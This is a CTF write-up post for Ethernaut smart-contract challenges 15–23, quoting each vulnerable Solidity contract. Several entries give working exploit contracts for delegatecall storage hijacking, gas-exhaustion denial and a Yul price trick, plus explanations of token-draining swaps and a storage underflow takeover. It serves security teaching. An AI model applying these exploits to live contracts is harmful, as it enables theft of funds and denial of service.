---
title: Ethernaut CTF Writeups II 
date: 2021-10-18
tags: [smart contracts, ethereum, writeup]
slug: ethernaut-ctf-writeups-2
---

# <a name="top"></a> Ethernaut CTF Writeups II

This post contains writeups for challenges starting from 15th. [Ethernaut CTF Writeups I
](https://s3v3ru5.github.io/notes/ethernaut-ctf-writeups-1) contains writeups for other challenges

- [15. Naught Coin](#naughtcoin)
- [16. Preservation](#preservation)
- [17. Recovery](#recovery)
- [18. Magic Number](#magicnumber)
- [19. Alien Codex](#aliencodex)
- [20. Denial](#denial)
- [21. Shop](#shop)
- [22. Dex](#dex)
- [23. Dex Two](#dextwo)

---

# <a name="naughtcoin"></a> 15. Naught Coin
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

NaughtCoin is a ERC20 token and we have to make our NaughtCoin balance to 0 to complete this challenge. Implementation of NaughtCoin overrides "transfer" function of ERC20. Main change is that an extra check is added for the "transfer" function to only allow us("player") to withdraw the tokens after a certain timelock period. Any user other than the player can withdraw their tokens irrespective of timelock period. So, to complete this challenge, we have to use another way of spending ERC20 tokens. ERC20 tokens, additional to simple transfer method, allows another user to spend the tokens of other uses if the other user explicitly allows the spender to spend certain number of tokens. It is done by using "approve" and "transferFrom" methods of ERC20 contract. So, to solve this challenge, we can approve different address that we own to spend our tokens and use "transferFrom" to transfer the tokens.

---

# <a name="preservation"></a> 16. Preservation
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Challenge contract stores addresses of two deployed contracts of LibraryContract. Functions "setFirstTime" and "setSecondTime" use delegate call to each of previously stored LibraryContract addresses and call "setTime" with "_timeStamp" argument. As mentioned in "Delegation" challenge writeup, when calling a contract using a delegate call, only the code is taken from the called contract and storage, msg referred in the code are still the caller's contract."setTime" updates "storedTime" which will be stored at storage slot 0. So, when "setTime" is called using delegate call, storage slot 0 of caller contract i.e challenge contract, will be written with our given time. storage slot 0 in "Preservation" contract is used to store contract address of "timeZone1Library", which means that we can overwrite the contract address to our desired value and when "setFirstTime" is called again, it will delegate call to overwritten address. We can deploy our malicious contract which will update owner when "setTime" is called using delegate call.

```solidity
pragma solidity ^0.6.0;

contract PreservationExploit {
      address public timeZone1Library;
      address public timeZone2Library;
      address public owner; 
      
      function setTime(uint256 timestamp) public {
          owner = address(timestamp);
      }
}
```

---

# <a name="recovery"></a> 17. Recovery
\[[top](#top)\]

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

SimpleToken contract is deployed in the "generateToken" function of Recovery contract. we have to find it's address and call destroy method of SimpleToken to complete this challenge. Whenever a contract is deployed, the address is calculated solely using sender's address and nonce. nonce represents number of the present transaction sent using that account. So, when simpleToken contract is deployed using new, it's address is calculated using Recovery contract address and it's nonce. [This](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed) stack overflow post provides implementations to compute the deployed address, given deployer's address and nonce. nonce is 1 for our SimpleToken deployement call.

python implementation taken from above mentioned post
```py
import rlp
from eth_utils import keccak, to_checksum_address, to_bytes


def mk_contract_address(sender: str, nonce: int) -> str:
    """Create a contract address using eth-utils.

    # https://ethereum.stackexchange.com/a/761/620
    """
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    address_bytes = h[12:]
    return to_checksum_address(address_bytes)
```

---

# <a name="magicnumber"></a> 18. MagicNumber
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____        
     __________/\\\\\_____/\\\///////\\\___       
      ________/\\\/\\\____\///______\//\\\__      
       ______/\\\/\/\\\______________/\\\/___     
        ____/\\\/__\/\\\___________/\\\//_____    
         __/\\\\\\\\\\\\\\\\_____/\\\//________   
          _\///////////\\\//____/\\\/___________  
           ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
            ___________\///_____\///////////////__
  */
}
```

We will pass this challenge if we provide an address where solver contract is deployed. solver contract's "whatIsTheMeaningOfLife" function should return magic number(42) when called but number of opcodes can be atmost 10. The bytes stored at a contract's address is evm bytecode and whenever the contract is called, that bytecode is executed in EVM. EVM doesn't store any additional information like function signatures and offset where their implementation starts. It's the job of the code at the contract address to dispatch to correct offset based on the message data. One can say that, the starting code of a deployed code is a large switch statement, dispatching calls to functions based on the 4 byte signature stored in the "msg.data" field. Our solver contract is called only once allowing us to remove the starting code and always return the magic number. EVM is a stack machine and [this](https://github.com/wolflo/evm-opcodes) lists all the available instructions and how top of the stack is changed for each instruction.

"RETURN" instruction returns data from memory of given length and present at given offset. So, we have to store the data(magic number) first in memory using "MSTORE" at some offset and return that using "RETURN".

```asm
PUSH1 0x2A ; push magic number onto the stack
PUSH1 0x0  ; push offset into memory 
MSTORE     ; store data at given offset, mem[0x0] = 0x2A = 42
PUSH 0x20  ; push length of the data to return
PUSH 0x0   ; push memory offset to return the data from
RETURN     ; return data present at mem[0x0: 0x0 + 0x20]
```

We also have to write the code for constructor function. when the contract is deployed, the constructor code is usually present at the starting and it returns the final code which is stored at the smart contract address to the evm. So, our constructor has to return the bytes corresponding to the above instructions. codecopy instruction is used to copy the bytecode. Final bytecode is equivalent to

```asm
00: PUSH1 0x0a ; length         // 600a
02: DUP1                        // 80
03: PUSH1 0x0c ; codeoffset     // 600c
05: PUSH1 0x00                  // 6000
07: CODECOPY                    // 39
08: PUSH1 0x0                   // 6000
0a: RETURN                      // f3
0b: STOP                        // 00
0c: PUSH1 0x2A                  // 602A
0e: PUSH1 0x0                   // 6000
10: MSTORE     ; mem[0] = 0x2A  // 52
11: PUSH 0x20                   // 6020
13: PUSH 0x0                    // 6000
15: RETURN                      // f3
```

```
600a80600c6000396000f300602a60005260206000f3
```

---

# <a name="aliencodex"></a> 19. Alien Codex
\[[top](#top)\]


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

AlienCodex inherits Ownable contract. Our challenge is to become the owner of the contract. "owner" variable is defined in Ownable contract and as AlienCodex inherits Ownable contract, owner variable is stored at storage slot 0. AlienCodex contract also declares a dynamic array "codex" and provides public functions to push a element, "decrement" the length and set given value at given index. The bug is in "retract" function, it decrements array length without checking if the length is greater then 0 or not. if the length is decremented when it is still 0, due to integer underflow it becomes $2^{256} - 1$. This helps because before accessing an element at an index, it checks that index is less than the length. So, if we make length equal to $2^{256} - 1$, we can read or write at any index and we can use that to write at storage slot 0 which holds owner variable's data.

When allocating storage for dynamic arrays, only the length is stored at the original slot(p) and the data is stored continously at "keccak256(p)". It means that when accessing the element, storage slot $keccak256(p) + index$ is accessed. The storage slot number is also stored in 256-bit, as a result when large index is used i.e $keccak256(p) + index$ is greater than $2^{256} - 1$, it overflows. With this and "revise" function, we can change owner variable stored at storage slot 0 .


---

# <a name="denial"></a> 20. Denial
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

This challenge is similar to "9. King" challenge. We have to deny the owner from withdrawing the funds. The exploit for "King" challenge doesn't work here, That's because "call" is used instead of "transfer" to send ether. "call" doesn't propagate the errors, it just returns boolean indicating the success of the "call". so, simply reverting from fallback function doesn't solve this challenge. What we can do is consume all the available gas in the fallback function using some gas heavy operations and when the call is completed, there won't be enough gas for further operations and transaction fails because of low gas. As storage operations consume maximum gas, we can use loops to repeatedly read and write to storage. 

```solidity
pragma solidity ^0.6.0;

contract DenialExploit {
    uint f;
    uint s;
    uint k;
    receive() external payable {
        for (uint i = 0; i < 10000; i++) {
            f = f + i**2;
            s = s + f;
        }
    }
}
```

---

# <a name="shop"></a> 21. Shop
\[[top](#top)\]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price{gas:3300}() >= price && !isSold) {
      isSold = true;
      price = _buyer.price{gas:3300}();
    }
  }
}
```

This challenge is similar to "11. Elevator" i.e we have to return different values from the same function, based on the number of call. In this, for the first call to our "Buyer" contract's "price" function, it has to return number greater than 100 and for second call to the same function, it should return number less than 100. This challenge differs "Elevator" challenge in how much gas is forwarded for the call. While calling "price" function, "Shop" contract forwards exactly "3300" gas. $3300$ gas is very less to do any storage operations i.e provided gas is not enough to store a value in state variable which makes "Elevator" challenge exploit useless. Without a state variable, we have to use "Shop" contracts "isSold" variable to differentiate the calls. Note that "isSold" is changed to true between the two calls. Even if we don't use storage related operations, to complete message call to another contract with the available gas, we have to write the price function in solidity assembly "Yul" language minimizing the gas consumption.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Buyer {
    Shop public shop;
    bool public a;
    // constant variables are replaced at compile time.
    address constant shopAddress = 0xeE2Bce1C36041B5073a8420767A1e7997738cEE8;
    bytes4 constant signature = hex"e852e741";
    
    constructor(address _shop) public {
        shop = Shop(_shop);
    }
    
    function price() public  returns (uint result) {

        assembly {
                let x := mload(0x40)
                result := mload(0x40)
                mstore(x, signature)
                let success := call(      
                            gas(), // remaining gas
                            shopAddress, // To addr
                            0,    // No wei passed
                            x,    // Inputs are at location x
                            0x4, // Inputs size two padded, so 68 bytes
                            x,    //Store output over input
                            0x20)
                if eq(mload(x), 0) {
                    mstore(result, 100)
                }
                return(result, 0x20)
        }
    }
    
    function callBuy() public {
        shop.buy();
    }
}
```

---

# <a name="dex"></a> 22. Dex
\[[top](#top)\]

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

Dex contract allows exchange between two ERC20 tokens. This token addresses are stored at the time of deployment and Dex allows only exchanging between these two tokens. Intially, we have 10 tokens of each token1 and token2, whereas Dex contract has 100 tokens in it's liquidity pool. Our goal is to drain all the tokens of any one token. The bug is in the "get_swap_price" function. it is calculated as

$$
swap_amount = \frac{amount * to\_balance}{from\_balance}
$$

Because of incorrect swap_amount, simple sequence of swappings will result in draining of one tokens balance

```asm
TKN1 => TKN2 => TKN1 => TKN2 => TKN1 => ...
```

---

# <a name="dextwo"></a> 23. Dex Two
\[[top](#top)\]

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

DexTwo contract is quite similar to Dex contract above. only change is that we can now exchange between any two ERC20 tokens as long as it is present in DexTwo liquidity pool. challenge is to drain both the tokens from the contract. As same get_swap_amount is used, we can use above exploit to drain one of the tokens first and then create our own fake token and repeat the same draining the balance from the remaining token.

